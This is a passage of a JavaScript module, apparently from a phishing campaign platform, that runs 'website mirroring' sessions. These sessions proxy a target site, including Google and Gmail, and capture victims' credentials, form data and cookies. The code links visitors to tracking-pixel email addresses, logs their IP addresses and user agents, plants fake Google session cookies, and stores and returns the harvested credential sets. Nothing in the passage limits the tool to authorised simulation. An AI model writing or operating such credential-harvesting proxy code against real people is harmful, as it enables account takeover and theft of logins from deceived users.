      this.cookieJars.set(sessionToken, cookieJar);
      
      // Initialize session storage for this session
      this.sessionStorage.set(sessionToken, {});
      
      // Initialize captures for this session
      this.captures.set(sessionToken, {
        credentials: [],
        formData: [],
        cookies: []
      });
      
      // Optimize session for Google services if needed
      if (normalizedUrl.includes('google.com') || normalizedUrl.includes('gmail.com')) {
        this.optimizeGoogleSession(sessionToken, normalizedUrl);
      }
      
      // Store session info
      const sessionData = {
        sessionId,
        campaignId,
        targetUrl: normalizedUrl,
        sessionToken,
        proxyUrl,
        startTime: new Date()
      };
      
      this.activeSessions.set(sessionToken, sessionData);
      this.mirrorRoutes.set(`/${sessionToken}`, sessionData);

      console.log(`Website mirroring session created: ${proxyUrl} -> ${normalizedUrl}`);
      
      return {
        sessionId,
        sessionToken,
        proxyUrl,
        targetUrl: normalizedUrl,
        proxyPort: 5000 // Always use port 5000
      };
    } catch (error) {
      console.error('Error creating mirror session:', error);
      throw error;
    }
  }

  /**
   * Track access to mirrored content
   */
  async trackAccess(sessionId, req) {
    try {
      const timestamp = new Date().toISOString();
      const ip = req.ip || req.connection.remoteAddress;
      const userAgent = req.get('User-Agent') || '';
      const trackingParam = req.query._fstrike_track;

      // Update last accessed time and increment counter
      db.run(
        `UPDATE WebsiteMirroringSessions 
         SET last_accessed = ?, access_count = access_count + 1 
         WHERE id = ?`,
        [timestamp, sessionId]
      );

      // If tracking ID is provided, store it with the session for later use
      if (trackingParam) {
        console.log(`Mirror access tracked with ID ${trackingParam}: Session ${sessionId}, IP: ${ip}`);
        
        // Find the session in memory
        for (const [token, session] of this.activeSessions.entries()) {
          if (session.sessionId === sessionId) {
            // Store tracking ID with session data for later credential association
            session.trackingId = trackingParam;
            this.activeSessions.set(token, session);
            console.log(`Stored tracking ID ${trackingParam} with session ${sessionId}`);
            break;
          }
        }
        
        // Check if this corresponds to a tracking pixel
        db.get(
          `SELECT user_email FROM tracking_pixels WHERE id = ?`,
          [trackingParam],
          (err, row) => {
            if (!err && row) {
              console.log(`Mirror access by user: ${row.user_email}`);
              
              // Create link_clicks table if it doesn't exist
              db.run(`CREATE TABLE IF NOT EXISTS link_clicks (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                campaign_id INTEGER,
                landing_page_id INTEGER,
                ip_address TEXT,
                user_agent TEXT,
                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
              )`, function(createErr) {
                if (createErr) {
                  console.error('Error creating link_clicks table:', createErr);
                  return;
                }
                
                // Now insert the click data
                db.run(
                  `INSERT INTO link_clicks (campaign_id, landing_page_id, ip_address, user_agent)
                   VALUES (?, 0, ?, ?)`,
                  [sessionId, ip, userAgent]
                );
              });
            }
          }
        );
      } else {
        console.log(`Mirror access tracked: Session ${sessionId}, IP: ${ip}, Path: ${req.path}`);
      }
    } catch (error) {
      console.error('Error tracking access:', error);
    }
  }

  /**
   * Stop a mirroring session
   */
  async stopMirrorSession(sessionId) {
    try {
      // Find session by ID
      let sessionToken = null;
      for (const [token, session] of this.activeSessions.entries()) {
        if (session.sessionId === sessionId) {
          sessionToken = token;
          break;
        }
      }

      if (sessionToken) {
        // Get final state of captures
        const captures = this.captures.get(sessionToken);
        
        // Store captures in database if there are any credentials
        if (captures && captures.credentials.length > 0) {
          db.run(
            `UPDATE WebsiteMirroringSessions 
             SET captured_data = ? 
             WHERE id = ?`,
            [JSON.stringify(captures), sessionId]
          );
          
          console.log(`Stored ${captures.credentials.length} credential sets for session ${sessionId}`);
        }
        
        // Clean up memory
        this.activeSessions.delete(sessionToken);
        this.mirrorRoutes.delete(`/${sessionToken}`);
        this.cookieJars.delete(sessionToken);
        this.sessionStorage.delete(sessionToken);
        this.captures.delete(sessionToken);
      }

      // Update database
      await new Promise((resolve, reject) => {
        db.run(
          `UPDATE WebsiteMirroringSessions 
           SET status = 'inactive' 
           WHERE id = ?`,
          [sessionId],
          (err) => {
            if (err) reject(err);
            else resolve();
          }
        );
      });

      console.log(`Mirror session ${sessionId} stopped`);
    } catch (error) {
      console.error('Error stopping mirror session:', error);
      throw error;
    }
  }

  /**
   * Get mirroring session details
   */
  async getMirrorSession(campaignId) {
    return new Promise((resolve, reject) => {
      db.get(
        `SELECT * FROM WebsiteMirroringSessions 
         WHERE campaign_id = ? AND status = 'active' 
         ORDER BY created_at DESC LIMIT 1`,
        [campaignId],
        (err, row) => {
          if (err) reject(err);
          else resolve(row);
        }
      );
    });
   }

  /**
   * Helper methods
   */
  normalizeUrl(url) {
    if (!url.startsWith('http://') && !url.startsWith('https://')) {
      url = 'https://' + url;
    }
    return url.endsWith('/') ? url.slice(0, -1) : url;
  }

  /**
   * Clean up inactive sessions
   */
  async cleanupSessions() {
    try {
      // Stop sessions that haven't been accessed in 24 hours
      const cutoffTime = new Date(Date.now() - 24 * 60 * 60 * 1000);
      
      const inactiveSessions = await new Promise((resolve, reject) => {
        db.all(
          `SELECT id FROM WebsiteMirroringSessions 
           WHERE status = 'active' 
           AND (last_accessed IS NULL OR last_accessed < ?)`,
          [cutoffTime.toISOString()],
          (err, rows) => {
            if (err) reject(err);
            else resolve(rows);
          }
        );
      });

      for (const session of inactiveSessions) {
        await this.stopMirrorSession(session.id);
      }

      console.log(`Cleaned up ${inactiveSessions.length} inactive mirroring sessions`);
    } catch (error) {
      console.error('Error cleaning up sessions:', error);
    }
  }
  
  /**
   * Optimize session for Google services
   */
  optimizeGoogleSession(sessionToken, targetUrl) {
    try {
      const cookieJar = this.cookieJars.get(sessionToken);
      if (!cookieJar) return;

      // Add essential Google cookies for better session persistence
      const googleDomain = new URL(targetUrl).hostname;
      
      // Generate realistic Google session cookies
      const essentialCookies = [
        { name: 'HSID', value: this.generateRandomToken(16) },
        { name: 'SSID', value: this.generateRandomToken(16) },
        { name: 'APISID', value: this.generateRandomToken(16) },
        { name: 'SAPISID', value: this.generateRandomToken(16) },
        { name: 'SID', value: this.generateRandomToken(16) },
        { name: '__Secure-3PSID', value: this.generateRandomToken(16) },
        { name: 'NID', value: this.generateRandomToken(32) }
      ];

      essentialCookies.forEach(cookie => {
        try {
          cookieJar.setCookieSync(`${cookie.name}=${cookie.value}; Domain=${googleDomain}; Path=/; Secure`, targetUrl);
        } catch (error) {
          console.warn(`Failed to set cookie ${cookie.name}:`, error.message);
        }
      });

      console.log(`🍪 Optimized Google session for ${googleDomain}`);
    } catch (error) {
      console.error('Error optimizing Google session:', error);
    }
  }

  /**
   * Generate random token for cookie values
   */
  generateRandomToken(length) {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  /**
   * Get captured credentials for a session
   */
  async getCapturedCredentials(sessionId) {
    // Try to find the session token
    let sessionToken = null;
    for (const [token, session] of this.activeSessions.entries()) {
      if (session.sessionId === sessionId) {
        sessionToken = token;
        break;
      }
    }
    
    // Get captures from memory if available
    if (sessionToken && this.captures.has(sessionToken)) {
      return this.captures.get(sessionToken);
    }
    
    // Otherwise try to get from database
    return new Promise((resolve, reject) => {
      db.get(
        `SELECT captured_data FROM WebsiteMirroringSessions WHERE id = ?`,
        [sessionId],
        (err, row) => {
          if (err) reject(err);
          else if (row && row.captured_data) {
            try {
              resolve(JSON.parse(row.captured_data));
            } catch (e) {
              resolve({ credentials: [], formData: [], cookies: [] });
            }
          } else {
            resolve({ credentials: [], formData: [], cookies: [] });
          }
        }
      );
    });
  }
}

module.exports = new WebsiteMirroringService();